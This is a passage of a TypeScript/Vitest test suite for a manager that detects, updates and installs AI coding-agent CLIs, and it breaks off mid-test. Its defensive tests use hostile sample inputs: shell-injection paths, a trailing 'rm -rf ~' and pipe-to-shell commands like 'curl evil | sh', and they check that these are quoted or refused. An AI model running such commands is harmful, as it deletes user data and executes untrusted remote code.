import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { buildApp } from "./app.js";
import {
  AgentCliManager,
  compareVersions,
  inferSource,
  isConflicting,
  lastLine,
  mergePath,
  nodeRangeSatisfied,
  pathFromEnvOutput,
  OMP_HOMEPAGE,
  planInstall,
  planUpdate,
  shellQuote,
  type PlanContext,
  type SpawnUpgrade,
  type UpgradeChild,
} from "./agent-clis.js";
import type { SpawnAgent } from "./local-agents.js";

let dirs: string[] = [];
afterEach(() => {
  vi.useRealTimers();
  for (const dir of dirs) rmSync(dir, { recursive: true, force: true });
  dirs = [];
});

const exists =
  (...files: string[]): PlanContext["isExecutable"] =>
  (file) =>
    files.includes(file);

const mac = (files: string[] = [], npm?: string): PlanContext => ({
  platform: "darwin",
  isExecutable: exists(...files),
  npm,
});

describe("inferSource", () => {
  it.each([
    [
      "/Users/a/.nvm/versions/node/v22.1.0/bin/codex",
      "/Users/a/.nvm/versions/node/v22.1.0/lib/node_modules/@openai/codex/bin/codex.js",
      "nvm",
    ],
    ["/opt/homebrew/bin/codex", "/opt/homebrew/Caskroom/codex/0.146.0/codex", "homebrew"],
    ["/usr/local/bin/gemini", "/usr/local/Cellar/gemini-cli/0.13.0/bin/gemini", "homebrew"],
    [
      "/opt/homebrew/bin/claude",
      "/opt/homebrew/lib/node_modules/@anthropic-ai/claude-code/cli.js",
      "homebrew",
    ],
    ["/Users/a/.volta/bin/claude", "/Users/a/.volta/bin/volta-shim", "volta"],
    ["/Users/a/.local/state/fnm_multishells/123/bin/codex", "/x/codex.js", "fnm"],
    ["/Users/a/.local/share/mise/installs/node/22/bin/codex", "/x/codex.js", "mise"],
    ["/Users/a/.bun/bin/omp", "/Users/a/.bun/bin/omp", "bun"],
    [
      "/Users/a/Library/pnpm/codex",
      "/Users/a/Library/pnpm/global/5/node_modules/@openai/codex/bin/codex.js",
      "pnpm",
    ],
    ["/Users/a/.local/bin/claude", "/Users/a/.local/share/claude/versions/2.1.0", "native"],
    [
      "/Users/a/.local/bin/codex",
      "/Users/a/.codex/packages/standalone/releases/0.170.0-aarch64/codex",
      "native",
    ],
    [
      "/Users/a/.npm-global/bin/codex",
      "/Users/a/.npm-global/lib/node_modules/@openai/codex/bin/codex.js",
      "npm",
    ],
    ["/usr/local/bin/copilot", "/usr/local/lib/node_modules/@github/copilot/npm-loader.js", "npm"],
    ["/Users/a/.nix-profile/bin/omp", "/nix/store/abc-omp/bin/omp", "unknown"],
    ["/Users/a/bin/opencode", "/Users/a/bin/opencode", "unknown"],
  ])("%s → %s", (launcher, real, source) => {
    expect(inferSource(launcher, real)).toBe(source);
  });
});

describe("planUpdate", () => {
  const install = (tool: string, file: string, real = file) => ({
    path: file,
    realPath: real,
    source: inferSource(file, real),
  });

  it("uses the official installer's own update for native installs", () => {
    expect(
      planUpdate(
        "claude",
        install(
          "claude",
          "/Users/a/.local/bin/claude",
          "/Users/a/.local/share/claude/versions/2.1.0",
        ),
        mac(),
      ),
    ).toEqual({ kind: "anchored", command: "'/Users/a/.local/bin/claude' update" });
    const codex = planUpdate(
      "codex",
      install(
        "codex",
        "/Users/a/.local/bin/codex",
        "/Users/a/.codex/packages/standalone/releases/0.170.0/codex",
      ),
      mac(),
    );
    expect(codex.kind).toBe("anchored");
    expect(codex.kind === "anchored" && codex.command).toContain(
      "CODEX_INSTALL_DIR='/Users/a/.local/bin' CODEX_HOME='/Users/a/.codex' bash -c",
    );
  });

  it("anchors Homebrew installs to the brew next to them, and refuses when brew isn't there", () => {
    const cask = install(
      "codex",
      "/opt/homebrew/bin/codex",
      "/opt/homebrew/Caskroom/codex/0.1/codex",
    );
    expect(planUpdate("codex", cask, mac(["/opt/homebrew/bin/brew"]))).toEqual({
      kind: "anchored",
      command: "'/opt/homebrew/bin/brew' upgrade --cask codex",
    });
    const formula = install(
      "opencode",
      "/opt/homebrew/bin/opencode",
      "/opt/homebrew/Cellar/opencode/1.0/bin/opencode",
    );
    expect(planUpdate("copilot", formula, mac(["/opt/homebrew/bin/brew"]))).toEqual({
      kind: "anchored",
      command: "'/opt/homebrew/bin/brew' upgrade opencode",
    });
    const missing = planUpdate("codex", cask, mac());
    expect(missing).toMatchObject({
      kind: "manual",
      reasonText: { key: "agentCli.manual.noManager" },
    });
  });

  it("anchors npm to the node manager that owns the install", () => {
    const bin = "/Users/a/.nvm/versions/node/v22.1.0/bin";
    const plan = planUpdate(
      "codex",
      install(
        "codex",
        `${bin}/codex`,
        "/Users/a/.nvm/versions/node/v22.1.0/lib/node_modules/@openai/codex/bin/codex.js",
      ),
      mac([`${bin}/npm`]),
    );
    expect(plan).toEqual({
      kind: "anchored",
      command: `PATH='${bin}':"$PATH" '${bin}/npm' i -g @openai/codex@latest`,
    });
    // 同目录没有 npm：不猜，交给人
    expect(
      planUpdate(
        "codex",
        install("codex", `${bin}/codex`, `${bin}/../lib/node_modules/@openai/codex/x.js`),
        mac(),
      ),
    ).toMatchObject({ kind: "manual", reasonText: { params: { manager: "npm" } } });
  });

  it("writes npm installs with a custom prefix back to that prefix", () => {
    const plan = planUpdate(
      "copilot",
      install(
        "copilot",
        "/Users/a/.npm-global/bin/copilot",
        "/Users/a/.npm-global/lib/node_modules/@github/copilot/npm-loader.js",
      ),
      mac([], "/usr/local/bin/npm"),
    );
    expect(plan).toEqual({
      kind: "anchored",
      command: "'/usr/local/bin/npm' i -g --prefix '/Users/a/.npm-global' @github/copilot@latest",
    });
  });

  it("prefers the tool's own update with the anchored package manager as fallback", () => {
    const plan = planUpdate(
      "claude",
      install(
        "claude",
        "/Users/a/.npm-global/bin/claude",
        "/Users/a/.npm-global/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe",
      ),
      mac([], "/usr/local/bin/npm"),
    );
    expect(plan.kind === "anchored" && plan.command).toBe(
      "npm_config_allow_scripts=@anthropic-ai/claude-code npm_config_ignore_scripts=false npm_config_include=optional " +
        "'/Users/a/.npm-global/bin/claude' update || '/usr/local/bin/npm' i -g --prefix '/Users/a/.npm-global' " +
        "@anthropic-ai/claude-code@latest --ignore-scripts=false --include=optional --allow-scripts=@anthropic-ai/claude-code",
    );
    // omp：只有 bun 装得出能跑的 omp；Nix 的不执行
    expect(
      planUpdate("omp", install("omp", "/Users/a/.bun/bin/omp"), mac(["/Users/a/.bun/bin/bun"])),
    ).toEqual({
      kind: "anchored",
      command:
        "'/Users/a/.bun/bin/omp' update || '/Users/a/.bun/bin/bun' add -g @oh-my-pi/pi-coding-agent@latest",
    });
    expect(planUpdate("omp", install("omp", "/Users/a/.local/bin/omp"), mac())).toEqual({
      kind: "anchored",
      command: "'/Users/a/.local/bin/omp' update",
    });
    expect(
      planUpdate(
        "omp",
        install("omp", "/Users/a/.nix-profile/bin/omp", "/nix/store/x-omp/bin/omp"),
        mac(),
      ),
    ).toMatchObject({ kind: "manual", reasonText: { key: "agentCli.manual.nix" } });
  });

  it("refuses sources it can't recognise and Windows", () => {
    expect(planUpdate("copilot", install("copilot", "/Users/a/bin/copilot"), mac())).toMatchObject({
      kind: "manual",
      reasonText: { key: "agentCli.manual.unknownSource" },
    });
    expect(
      planUpdate("copilot", install("copilot", "C:/npm/copilot.cmd"), {
        ...mac(),
        platform: "win32",
      }),
    ).toMatchObject({ kind: "manual", reasonText: { key: "agentCli.manual.windows" } });
  });

  it("quotes paths so they can't inject shell syntax", () => {
    const evil = "/Users/a/x'; touch /tmp/pwned; echo '/.local/bin/claude";
    const plan = planUpdate(
      "claude",
      { path: evil, realPath: "/Users/a/.local/share/claude/versions/1", source: "native" },
      mac(),
    );
    expect(plan).toEqual({ kind: "anchored", command: `${shellQuote(evil)} update` });
    expect(shellQuote(evil)).toBe(
      `'/Users/a/x'\\''; touch /tmp/pwned; echo '\\''/.local/bin/claude'`,
    );
    // 换行、相对路径一律不拼
    expect(
      planUpdate("claude", { path: "/a\n/claude", realPath: "/a/claude", source: "native" }, mac()),
    ).toMatchObject({ kind: "manual" });
    expect(
      planUpdate("claude", { path: "claude", realPath: "claude", source: "native" }, mac()),
    ).toMatchObject({ kind: "manual" });
  });
});

describe("versions", () => {
  it("compares semver including prereleases", () => {
    expect(compareVersions("2.1.327", "2.1.283")).toBe(1);
    expect(compareVersions("0.170.0", "0.170.0")).toBe(0);
    expect(compareVersions("1.0.0-beta.2", "1.0.0")).toBe(-1);
    expect(compareVersions("1.0.0-beta.10", "1.0.0-beta.2")).toBe(1);
    expect(compareVersions("2026.11.5", "2026.5.7")).toBe(1);
    expect(compareVersions("abc", "1.0.0")).toBeUndefined();
  });

  it.each([
    [">=22.19.0", "22.19.0", true],
    [">=22.19.0", "22.18.9", false],
    [">=18 <21 || >=22", "20.5.0", true],
    [">=18 <21 || >=22", "21.0.0", false],
    ["^18.17.0 || >=20", "18.16.0", false],
    ["^18.17.0 || >=20", "18.20.1", true],
    ["~20.1", "20.2.0", false],
    ["18.x", "18.9.1", true],
    ["18 - 20", "20.11.0", true],
    [">= 24.16", "24.16.0", true],
    [">24", "24.0.0", false],
    ["*", "16.0.0", true],
    ["latest", "22.0.0", undefined],
  ])("node %s with %s → %s", (range, version, expected) => {
    expect(nodeRangeSatisfied(range, version)).toBe(expected);
  });
});

describe("helpers", () => {
  it("reads PATH from noisy login shell output and merges", () => {
    expect(pathFromEnvOutput("Welcome!\nPATH=relative\nHOME=/x\nPATH=/a/bin:/b\n")).toBe(
      "/a/bin:/b",
    );
    expect(mergePath("/a:/b", "/b:/c::rel")).toBe("/a:/b:/c");
  });

  it("keeps the last non-empty line, strips color and caps length", () => {
    expect(lastLine("\u001b[32mfetching\u001b[0m\r50%\r100%\n\n")).toBe("100%");
    expect(lastLine("x".repeat(300))?.length).toBe(200);
    expect(lastLine("\n \n")).toBeUndefined();
  });

  it("flags conflicts only when versions differ or some can't run", () => {
    expect(isConflicting([{ version: "1.0.0", runnable: true }])).toBe(false);
    expect(
      isConflicting([
        { version: "1.0.0", runnable: true },
        { version: "1.0.0", runnable: true },
      ]),
    ).toBe(false);
    expect(
      isConflicting([
        { version: "1.0.0", runnable: true },
        { version: "1.1.0", runnable: true },
      ]),
    ).toBe(true);
    expect(
      isConflicting([
        { version: "1.0.0", runnable: true },
        { version: null, runnable: false },
      ]),
    ).toBe(true);
  });
});

/* ---------- 探测与升级：用临时目录里的假 CLI，不碰真实安装 ---------- */

function sandbox() {
  // macOS 的临时目录经 /var → /private/var 链接：按真实路径算，和探测结果一致
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), "hive-clis-")));
  dirs.push(root);
  const bin = (name: string) => {
    const dir = path.join(root, name);
    mkdirSync(dir, { recursive: true });
    return dir;
  };
  const script = (dir: string, name: string, body: string) => {
    const file = path.join(dir, name);
    writeFileSync(file, `#!/bin/sh\n${body}\n`);
    chmodSync(file, 0o755);
    return file;
  };
  return { root, bin, script };
}

class FakeUpgrade implements UpgradeChild {
  outputs: Array<(chunk: string) => void> = [];
  exits: Array<(code: number | null, error?: Error) => void> = [];
  killed = false;
  onOutput(listener: (chunk: string) => void) {
    this.outputs.push(listener);
  }
  onExit(listener: (code: number | null, error?: Error) => void) {
    this.exits.push(listener);
  }
  kill() {
    this.killed = true;
  }
  write(text: string) {
    for (const listener of this.outputs) listener(text);
  }
  exit(code: number | null) {
    for (const listener of this.exits) listener(code);
  }
}

function manager(options: {
  loginPath: string;
  extraDirs?: string[];
  latest?: Record<string, string>;
  engines?: Record<string, string>;
  spawn?: SpawnUpgrade;
  upgradeTimeoutMs?: number;
}) {
  const fetchJson = vi.fn(async (url: string) => {
    const tags = /\/-\/package\/(.+)\/dist-tags$/.exec(url);
    if (tags) {
      const latest = options.latest?.[decodeURIComponent(tags[1]!)];
      return latest ? { latest } : undefined;
    }
    const engines = /registry\.npmjs\.org\/(.+)\/[^/]+$/.exec(url);
    const node = engines && options.engines?.[decodeURIComponent(engines[1]!)];
    return node ? { engines: { node } } : {};
  });
  const spawnUpgrade = options.spawn ?? vi.fn<SpawnUpgrade>(() => new FakeUpgrade());
  return {
    fetchJson,
    spawnUpgrade,
    clis: new AgentCliManager({
      platform: "darwin",
      home: "/nonexistent-home",
      env: { PATH: "/usr/bin:/bin", HOME: "/nonexistent-home" },
      loginPath: async () => options.loginPath,
      extraDirs: options.extraDirs ?? [],
      fetchJson,
      spawnUpgrade,
      ...(options.upgradeTimeoutMs ? { upgradeTimeoutMs: options.upgradeTimeoutMs } : {}),
    }),
  };
}

describe("AgentCliManager detection", () => {
  it("finds installs on the login PATH and in extra dirs, dedupes symlinks and flags conflicts", async () => {
    const { bin, script, root } = sandbox();
    // 自定义前缀的 npm 全局安装：bin/codex → lib/node_modules/@openai/codex/bin/codex.js
    const prefix = path.join(root, ".npm-global");
    const pkgBin = bin(".npm-global/lib/node_modules/@openai/codex/bin");
    const real = script(pkgBin, "codex.js", 'echo "codex-cli 0.160.0"');
    const globalBin = bin(".npm-global/bin");
    symlinkSync(real, path.join(globalBin, "codex"));
    // 同一处又经另一个 PATH 目录链接过来：按真实路径去重
    const alias = bin("alias");
    symlinkSync(real, path.join(alias, "codex"));
    // 兜底目录里还有一份旧版，不在登录 PATH 上
    const extra = bin("extra");
    script(extra, "codex", 'echo "0.150.0"');
    // 装了但跑不起来
    script(globalBin, "copilot", 'echo "Error: Node 18 is too old" >&2; exit 1');
    const npm = script(bin("node/bin"), "npm", "exit 0");

    const { clis } = manager({
      loginPath: `${globalBin}:${alias}:${path.dirname(npm)}`,
      extraDirs: [extra],
      latest: { "@openai/codex": "0.170.0", "@github/copilot": "1.0.114" },
    });
    const list = await clis.list();
    expect(list.map((item) => item.tool)).toEqual([
      "claude",
      "codex",
      "copilot",
      "opencode",
      "omp",
      "openclaw",
    ]);
    const codex = list.find((item) => item.tool === "codex")!;
    expect(codex).toMatchObject({
      status: "ok",
      version: "0.160.0",
      latest: "0.170.0",
      updateAvailable: true,
      conflict: true,
      plan: {
        kind: "anchored",
        command: `${shellQuote(npm)} i -g --prefix ${shellQuote(prefix)} @openai/codex@latest`,
      },
    });
    expect(codex.installations).toHaveLength(2);
    expect(codex.installations[0]).toMatchObject({
      path: path.join(globalBin, "codex"),
      source: "npm",
      pathDefault: true,
      runnable: true,
    });
    expect(codex.installations[1]).toMatchObject({ version: "0.150.0", pathDefault: false });

    const copilot = list.find((item) => item.tool === "copilot")!;
    expect(copilot).toMatchObject({ status: "broken", version: null, updateAvailable: true });
    expect(copilot.installations[0]!.error).toContain("Node 18 is too old");

    expect(list.find((item) => item.tool === "claude")).toMatchObject({
      status: "notInstalled",
      installations: [],
    });
  });

  it("refuses to offer an update the local Node can't run", async () => {
    const { bin, script } = sandbox();
    const nvm = bin(".nvm/versions/node/v20.1.0/bin");
    const pkg = bin(".nvm/versions/node/v20.1.0/lib/node_modules/openclaw");
    const real = script(pkg, "openclaw.mjs", 'echo "OpenClaw 2026.5.7"');
    symlinkSync(real, path.join(nvm, "openclaw"));
    script(nvm, "node", 'echo "v20.1.0"');
    script(nvm, "npm", "exit 0");
    const { clis } = manager({
      loginPath: nvm,
      latest: { openclaw: "2026.11.5" },
      engines: { openclaw: ">=24.16.0" },
    });
    const openclaw = (await clis.list()).find((item) => item.tool === "openclaw")!;
    expect(openclaw).toMatchObject({
      updateAvailable: true,
      nodeGap: { required: ">=24.16.0", current: "20.1.0" },
    });
    await expect(
      clis.upgrade("openclaw", (openclaw.plan as { command: string }).command),
    ).rejects.toMatchObject({ code: "AGENT_CLI_NODE_TOO_OLD" });
  });

  it("shows the latest version as unknown when the registry can't be reached", async () => {
    const { bin, script } = sandbox();
    const dir = bin("native");
    const claudeBin = script(dir, "claude", 'echo "2.1.0 (Claude Code)"');
    script(dir, "copilot", 'echo "1.0.88"');
    const { clis } = manager({ loginPath: dir });
    const list = await clis.list();
    const claude = list.find((item) => item.tool === "claude")!;
    expect(claude).toMatchObject({ version: "2.1.0", latest: null, updateAvailable: false });
    // 认不出来源：自带升级子命令的交给它自己（它认得自己的安装方式），没有的不给命令
    expect(claude.plan).toEqual({ kind: "anchored", command: `${shellQuote(claudeBin)} update` });
    expect(list.find((item) => item.tool === "copilot")!.plan).toMatchObject({
      kind: "manual",
      reasonText: { key: "agentCli.manual.unknownSource" },
    });
  });
});

describe("AgentCliManager upgrade", () => {
  async function setup(options: { upgradeTimeoutMs?: number } = {}) {
    const { bin, script } = sandbox();
    const nvm = bin(".nvm/versions/node/v22.1.0/bin");
    const pkg = bin(".nvm/versions/node/v22.1.0/lib/node_modules/@openai/codex/bin");
    const real = script(pkg, "codex.js", 'echo "codex-cli 0.160.0"');
    symlinkSync(real, path.join(nvm, "codex"));
    script(nvm, "npm", "exit 0");
    const children: FakeUpgrade[] = [];
    const spawn = vi.fn<SpawnUpgrade>(() => {
      const child = new FakeUpgrade();
      children.push(child);
      return child;
    });
    const made = manager({
      loginPath: nvm,
      latest: { "@openai/codex": "0.170.0" },
      spawn,
      ...options,
    });
    const codex = (await made.clis.list()).find((item) => item.tool === "codex")!;
    const command = (codex.plan as { command: string }).command;
    const bump = () => script(pkg, "codex.js", 'echo "codex-cli 0.170.0"');
    return { ...made, spawn, children, command, bump, nvm };
  }

  it("runs only the confirmed command, one at a time, with throttled single-line progress", async () => {
    const { clis, spawn, children, command, bump, nvm } = await setup();
    expect(command).toBe(
      `PATH=${shellQuote(nvm)}:"$PATH" ${shellQuote(`${nvm}/npm`)} i -g @openai/codex@latest`,
    );
    await expect(clis.upgrade("codex", `${command}; rm -rf ~`)).rejects.toMatchObject({
      code: "AGENT_CLI_PLAN_CHANGED",
    });
    expect(spawn).not.toHaveBeenCalled();

    const job = await clis.upgrade("codex", command);
    expect(job).toMatchObject({ state: "running", command, versionBefore: "0.160.0" });
    expect(spawn).toHaveBeenCalledWith(
      command,
      expect.objectContaining({ PATH: `${nvm}:/usr/bin:/bin` }),
    );
    // 全局一次一个
    await expect(clis.upgrade("codex", command)).rejects.toMatchObject({ code: "AGENT_CLI_BUSY" });
    await expect(clis.upgrade("claude", "x")).rejects.toMatchObject({ code: "AGENT_CLI_BUSY" });

    const child = children[0]!;
    child.write("npm http fetch GET 200 https://registry.npmjs.org/@openai%2fcodex 12ms\n");
    expect(clis.job(job.id)!.progress).toContain("npm http fetch");
    child.write("\u001b[1mreify\u001b[0m: timing\rchanged 2 packages\n");
    // 150ms 内的新行先攒着
    expect(clis.job(job.id)!.progress).toContain("npm http fetch");
    await new Promise((resolve) => setTimeout(resolve, 200));
    expect(clis.job(job.id)!.progress).toBe("changed 2 packages");

    bump();
    child.exit(0);
    await vi.waitFor(() => expect(clis.job(job.id)).toMatchObject({ versionAfter: "0.170.0" }));
    expect(clis.job(job.id)).toMatchObject({ state: "succeeded" });
    expect(clis.current()?.id).toBe(job.id);
    // 升完是最新版，再点就拒绝
    await expect(clis.upgrade("codex", command)).rejects.toMatchObject({
      code: "AGENT_CLI_UP_TO_DATE",
    });
  });

  it("reports the last lines of output when the command fails, then frees the lock", async () => {
    const { clis, children, command } = await setup();
    const job = await clis.upgrade("codex", command);
    const child = children[0]!;
    child.write(
      Array.from({ length: 12 }, (_, i) => `line ${i}`).join("\n") +
        "\nnpm error code EACCES\nnpm error path /usr/local/lib/node_modules\n",
    );
    child.exit(243);
    const failed = clis.job(job.id)!;
    expect(failed).toMatchObject({
      state: "failed",
      reasonText: { key: "error.agentCli.exitCode", params: { code: "243" } },
    });
    expect(failed.error!.split("\n")).toHaveLength(8);
    expect(failed.error).toContain("npm error code EACCES");
    expect(failed.error).not.toContain("line 5");
    // 失败后可以重试
    await expect(clis.upgrade("codex", command)).resolves.toMatchObject({ state: "running" });
  });

  it("stops a command that runs too long", async () => {
    const { clis, children, command } = await setup({ upgradeTimeoutMs: 50 });
    const job = await clis.upgrade("codex", command);
    await vi.waitFor(() => expect(clis.job(job.id)?.state).toBe("failed"));
    expect(children[0]!.killed).toBe(true);
    expect(clis.job(job.id)!.reasonText).toMatchObject({ key: "error.agentCli.timeout" });
  });
});

/* ---------- 接口：只限本机房主 ---------- */

describe("agent cli routes", () => {
  let close: (() => Promise<void>) | undefined;
  afterEach(async () => {
    await close?.();
    close = undefined;
  });

  async function setup() {
    const { bin, script } = sandbox();
    const nvm = bin(".nvm/versions/node/v22.1.0/bin");
    const pkg = bin(".nvm/versions/node/v22.1.0/lib/node_modules/@openai/codex/bin");
    symlinkSync(script(pkg, "codex.js", 'echo "0.160.0"'), path.join(nvm, "codex"));
    script(nvm, "npm", "exit 0");
    const children: FakeUpgrade[] = [];
    const { clis, spawnUpgrade } = manager({
      loginPath: nvm,
      latest: { "@openai/codex": "0.170.0" },
      spawn: vi.fn<SpawnUpgrade>(() => {
        const child = new FakeUpgrade();
        children.push(child);
        return child;
      }),
    });
    const logs: string[] = [];
    const app = await buildApp({
      databasePath: ":memory:",
      token: "join-token",
      staticDir: "/definitely-not-present",
      logger: { level: "info", stream: { write: (line: string) => void logs.push(line) } },
      agentClis: clis,
      localAgents: {
        cli: { command: "/usr/bin/node", args: ["cli.js"] },
        serverUrl: "http://127.0.0.1:8787",
        spawn: vi.fn<SpawnAgent>(),
        probe: async () => ({ installed: true, version: "1.0.0" }),
      },
    });
    close = () => app.close();
    const session = (await app.inject({ method: "GET", url: "/api/local/session" })).json() as {
      ownerToken: string;
    };
    return { app, owner: { "x-hive-owner": session.ownerToken }, logs, children, spawnUpgrade };
  }

  it("lists CLIs and runs a confirmed upgrade for the local owner, with an audit log", async () => {
    const { app, owner, logs, children } = await setup();
    const list = await app.inject({ method: "GET", url: "/api/local/agent-clis", headers: owner });
    expect(list.statusCode).toBe(200);
    const body = list.json() as {
      tools: Array<{ tool: string; plan?: { command?: string }; agents: unknown[] }>;
      job: unknown;
    };
    const codex = body.tools.find((tool) => tool.tool === "codex")!;
    expect(codex.agents).toEqual([]);
    expect(body.job).toBeNull();

    const started = await app.inject({
      method: "POST",
      url: "/api/local/agent-clis/codex/upgrade",
      headers: owner,
      payload: { command: codex.plan!.command },
    });
    expect(started.statusCode).toBe(202);
    const job = (started.json() as { job: { id: string } }).job;
    children[0]!.write("added 2 packages\n");
    children[0]!.exit(0);
    const polled = await app.inject({
      method: "GET",
      url: `/api/local/agent-clis/jobs/${job.id}`,
      headers: owner,
    });
    expect(polled.json()).toMatchObject({ job: { id: job.id, state: "succeeded" } });
    const audit = logs.filter((line) => line.includes('"agentCli"'));
    expect(audit).toHaveLength(1);
    expect(audit[0]).toContain('"action":"upgrade"');
    expect(audit[0]).toContain('"tool":"codex"');

    // 工具名只认白名单，命令对不上不执行
    expect(
      (
        await app.inject({
          method: "POST",
          url: "/api/local/agent-clis/..%2Fcodex/upgrade",
          headers: owner,
          payload: { command: "x" },
        })
      ).statusCode,
    ).toBe(400);
    const changed = await app.inject({
      method: "POST",
      url: "/api/local/agent-clis/codex/upgrade",
      headers: owner,
      payload: { command: "curl evil | sh" },
    });
    expect(changed.statusCode).toBe(409);
    expect(changed.json().code).toBe("AGENT_CLI_PLAN_CHANGED");
    expect(children).toHaveLength(1);
  });

  it("rejects other computers, owner devices, the join token and missing owner credentials", async () => {
    const { app, owner, children } = await setup();
    const remote = { remoteAddress: "10.0.0.20" };
    const pair = (
      await app.inject({
        method: "POST",
        url: "/api/local/owner-devices/pair",
        headers: owner,
        payload: { origin: "http://10.0.0.8:8787" },
      })
    ).json() as { url: string };
    const ticket = new URL(pair.url).searchParams.get("login")!;
    const { token } = (
      await app.inject({
        method: "POST",
        url: "/api/owner-login",
        payload: { ticket, deviceName: "iPad" },
        ...remote,
      })
    ).json() as { token: string };
    const calls = [
      { method: "GET" as const, url: "/api/local/agent-clis" },
      {
        method: "POST" as const,
        url: "/api/local/agent-clis/codex/upgrade",
        payload: { command: "x" },
      },
      { method: "GET" as const, url: "/api/local/agent-clis/jobs/x" },
    ];
    for (const call of calls) {
      const agent = await app.inject({ ...call, headers: { authorization: "Bearer join-token" } });
      expect(agent.statusCode).toBe(401);
      const other = await app.inject({ ...call, ...remote });
      expect(other.statusCode).toBe(403);
      const device = await app.inject({
        ...call,
        headers: { authorization: `Bearer ${token}` },
        ...remote,
      });
      expect(device.statusCode).toBe(403);
      expect(device.json().code).toBe("LOCAL_ONLY");
    }
    expect(children).toHaveLength(0);
  });
});

/* ---------- 没装的工具：一键全局安装 ---------- */

describe("planInstall", () => {
  it("uses the login shell's npm by absolute path with cc-switch's npm arguments", () => {
    expect(
      planInstall("claude", {
        platform: "darwin",
        isExecutable: exists("/usr/local/bin/node"),
        npm: "/usr/local/bin/npm",
      }),
    ).toEqual({
      kind: "anchored",
      command:
        "PATH='/usr/local/bin':\"$PATH\" '/usr/local/bin/npm' i -g @anthropic-ai/claude-code@latest " +
        "--ignore-scripts=false --include=optional --allow-scripts=@anthropic-ai/claude-code",
    });
    expect(
      planInstall("opencode", { platform: "darwin", isExecutable: exists(), npm: "/n/npm" }),
    ).toEqual({
      kind: "anchored",
      command:
        "'/n/npm' i -g opencode-ai@latest --ignore-scripts=false --include=optional --allow-scripts=opencode-ai",
    });
    for (const [tool, pkg] of [
      ["codex", "@openai/codex"],
      ["copilot", "@github/copilot"],
      ["openclaw", "openclaw"],
    ] as const) {
      expect(
        planInstall(tool, { platform: "darwin", isExecutable: exists(), npm: "/n/npm" }),
      ).toEqual({
        kind: "anchored",
        command: `'/n/npm' i -g ${pkg}@latest`,
      });
    }
  });

  it("asks for Node.js when there's no npm, and installs omp only with bun", () => {
    expect(planInstall("codex", { platform: "darwin", isExecutable: exists() })).toMatchObject({
      kind: "manual",
      reasonText: { key: "agentCli.manual.noNode" },
    });
    expect(
      planInstall("omp", { platform: "darwin", isExecutable: exists(), npm: "/n/npm" }),
    ).toMatchObject({
      kind: "manual",
      reasonText: { key: "agentCli.manual.needBun" },
      url: OMP_HOMEPAGE,
    });
    expect(
      planInstall("omp", {
        platform: "darwin",
        isExecutable: exists(),
        bun: "/Users/a/.bun/bin/bun",
      }),
    ).toEqual({
      kind: "anchored",
      command: "'/Users/a/.bun/bin/bun' add -g @oh-my-pi/pi-coding-agent@latest",
    });
    expect(
      planInstall("codex", { platform: "win32", isExecutable: exists(), npm: "C:/npm.cmd" }),
    ).toMatchObject({ kind: "manual", reasonText: { key: "agentCli.manual.windows" } });
    // 路径照样单引号包住
    const evil = "/opt/x'; touch /tmp/pwned; '/npm";
    expect(planInstall("codex", { platform: "darwin", isExecutable: exists(), npm: evil })).toEqual(
      {
        kind: "anchored",
        command: `${shellQuote(evil)} i -g @openai/codex@latest`,
      },
    );
  });
});

describe("AgentCliManager install", () => {
  async function setup(options: { engines?: Record<string, string>; prefix?: string } = {}) {
    const { bin, script, root } = sandbox();
    const nodeBin = bin("node/bin");
    const prefix = options.prefix ?? path.join(root, "global");
    script(nodeBin, "npm", `[ "$1" = prefix ] && echo "${prefix}"; exit 0`);
    script(nodeBin, "node", 'echo "v22.1.0"');
    const children: FakeUpgrade[] = [];
    const made = manager({
      loginPath: options.prefix === undefined ? `${nodeBin}:${prefix}/bin` : nodeBin,
      latest: { "@openai/codex": "0.170.0" },
      ...(options.engines ? { engines: options.engines } : {}),
      spawn: vi.fn<SpawnUpgrade>(() => {
        const child = new FakeUpgrade();
        children.push(child);
        return child;
      }),
    });
    const codex = (await made.clis.list()).find((item) => item.tool === "codex")!;
    return { ...made, children, codex, nodeBin, prefix, bin, script };
  }

  it("plans an install for missing tools and runs only the confirmed command", async () => {
    const { clis, codex, children, nodeBin, prefix, bin, script } = await setup();
    expect(codex).toMatchObject({
      status: "notInstalled",
      latest: "0.170.0",
      plan: {
        kind: "anchored",
        command: `PATH=${shellQuote(nodeBin)}:"$PATH" ${shellQuote(`${nodeBin}/npm`)} i -g @openai/codex@latest`,
      },
    });
    expect(codex.binNotOnPath).toBeUndefined();
    const command = (codex.plan as { command: string }).command;

    await expect(clis.start("codex", "install", `${command} && curl x | sh`)).rejects.toMatchObject(
      {
        code: "AGENT_CLI_PLAN_CHANGED",
      },
    );
    // 没装的不能走升级
    await expect(clis.start("codex", "upgrade", command)).rejects.toMatchObject({
      code: "AGENT_CLI_NOT_UPGRADABLE",
    });
    const job = await clis.start("codex", "install", command);
    expect(job).toMatchObject({ action: "install", state: "running", versionBefore: null });
    expect(clis.current()?.id).toBe(job.id);

    // 装好：命令落在全局 bin 目录，重新探测拿到版本
    const pkg = bin("global/lib/node_modules/@openai/codex/bin");
    const real = script(pkg, "codex.js", 'echo "codex-cli 0.170.0"');
    bin("global/bin");
    symlinkSync(real, path.join(prefix, "bin", "codex"));
    children[0]!.exit(0);
    await vi.waitFor(() => expect(clis.job(job.id)).toMatchObject({ versionAfter: "0.170.0" }));
    // 装过了再点安装就拒绝
    await expect(clis.start("codex", "install", command)).rejects.toMatchObject({
      code: "AGENT_CLI_ALREADY_INSTALLED",
    });
  });

  it("warns when npm's global bin isn't on PATH and refuses when Node is too old", async () => {
    const warned = await setup({ prefix: "/opt/elsewhere" });
    expect(warned.codex.binNotOnPath).toBe("/opt/elsewhere/bin");

    const old = await setup({ engines: { "@openai/codex": ">=24" } });
    expect(old.codex.nodeGap).toEqual({ required: ">=24", current: "22.1.0" });
    await expect(
      old.clis.start("codex", "install", (old.codex.plan as { command: string }).command),
    ).rejects.toMatchObject({ code: "AGENT_CLI_NODE_TOO_OLD" });
    expect(old.children).toHaveLength(0);
  });

  it("serves install and the current task over the local-owner routes", async () => {
    const { clis, codex, children } = await setup();
    const logs: string[] = [];
    const app = await buildApp({
      databasePath: ":memory:",
      token: "join-token",
      staticDir: "/definitely-not-present",
      logger: { level: "info", stream: { write: (line: string) => void logs.push(line) } },
      agentClis: clis,
